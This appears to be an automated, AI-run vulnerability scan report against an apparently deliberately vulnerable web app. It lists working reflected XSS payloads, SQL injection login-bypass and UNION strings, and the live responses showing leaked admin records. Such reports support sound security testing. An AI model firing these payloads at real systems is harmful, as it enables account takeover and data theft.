# Vulnerability Research Report
**Target:** dvwu
**Date:** 2026-05-18 05:16 UTC
**Confirmed Findings:** 4

---

## Findings

### [HIGH] XSS - https://ist-edu-bd.vercel.app/api/comments and https://ist-edu-bd.vercel.app/api/search
**Confirmed:** Yes
**Proof of Concept:**

```
1) Reflected XSS: GET https://ist-edu-bd.vercel.app/api/comments?comment=%3Cscript%3Ealert(1)%3C%2Fscript%3E
2) Reflected XSS: GET https://ist-edu-bd.vercel.app/api/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E
Both responses render the payload inside the HTML body unsanitized, so opening the URL executes JavaScript and triggers alert(1).
```

**Evidence:**

```
Confirmed via live responses. /api/comments returned a page containing <div class="comment">
    <script>alert(1)</script>
  </div>. /api/search returned a page containing <strong><script>alert(1)</script></strong>. Source review also shows direct template-string interpolation of user input into HTML without escaping in target/source/api/comments.js and target/source/api/search.js.
```

### [HIGH] sqli - https://ist-edu-bd.vercel.app/api/portal and https://ist-edu-bd.vercel.app/api/search
**Confirmed:** Yes
**Proof of Concept:**

```
1) Authentication bypass via /api/portal (GET):
   /api/portal?username=admin'%20OR%201=1--&password=x
   Result: HTTP 200 with 'Authentication Bypass Successful' and 'Logged in as: admin'.

2) SQLi data leak via /api/search (GET):
   /api/search?q=%27
   Result: HTTP 200 with SQL error content and a 'Database Leak' table listing rows including admin/admin@ist.edu.bd.

3) UNION-style payload also triggers the leak page:
   /api/search?q=test'%20UNION%20SELECT%201,2,3--
   Result: HTTP 200 with the vulnerable SQL query echoed and the same database leak table.
```

**Evidence:**

```
Verified live responses from the target host:
- /api/portal?username=admin'%20OR%201=1--&password=x returned a successful login page with admin details.
- /api/search?q=%27 returned an SQL error page and a table containing sensitive user records.
- /api/search?q=test'%20UNION%20SELECT%201,2,3-- returned the same SQL error/leak page. Source review also shows intentionally vulnerable string concatenation and hardcoded leak behavior in api/portal.js and api/search.js.
```

### [HIGH] auth - /api/portal authentication endpoint
**Confirmed:** Yes
**Proof of Concept:**

```
1) Send a GET request to the in-scope login endpoint with a SQLi payload in the username and any password: /api/portal?username=admin'%20OR%201%3D1--&password=x
2) The endpoint returns HTTP 200 and an authentication-bypass success page.
3) The response explicitly shows admin identity details (User ID 1, Username admin, Role Administrator, Email admin@ist.edu.bd), confirming privilege escalation to another user account.
```

**Evidence:**

```
Confirmed live response from https://ist-edu-bd.vercel.app/api/portal?username=admin%27%20OR%201%3D1--&password=x returned HTTP 200 with body containing 'Authentication Bypass Successful!', 'Logged in as: Username: admin' and 'Role: Administrator'. Source code also shows vulnerable auth logic in api/portal.js / server.cjs where username input is used to trigger a bypass without real credential verification.
```

### [HIGH] Cross-Site Scripting (XSS) - https://ist-edu-bd.vercel.app/api/comments
**Confirmed:** Yes
**Proof of Concept:**

```
GET /api/comments?comment=%3Csvg%20onload%3Dalert(1)%3E
```

**Evidence:**

```
Verified in live response: the payload is reflected unescaped inside the HTML body: <div class="comment">
    <svg onload=alert(1)>
  </div>. This confirms reflected XSS. Source review of api/comments.js shows direct interpolation of req.query.comment into res.send() without sanitization.
```

## Cost Summary

**Total Cost:** $0.0195
**Cost per Confirmed Finding:** $0.0049
**Total Tokens:** 122535
**Input Tokens:** 120128
**Output Tokens:** 2407

## Cost Breakdown

### By Model
- gpt-5.4-mini: $0.0195

### By Scanner Swarm
- dvwu/auth/gpt-5.4-mini: $0.0058
- dvwu/source/gpt-5.4-mini: $0.0049
- dvwu/sqli/gpt-5.4-mini: $0.0050
- dvwu/xss/gpt-5.4-mini: $0.0038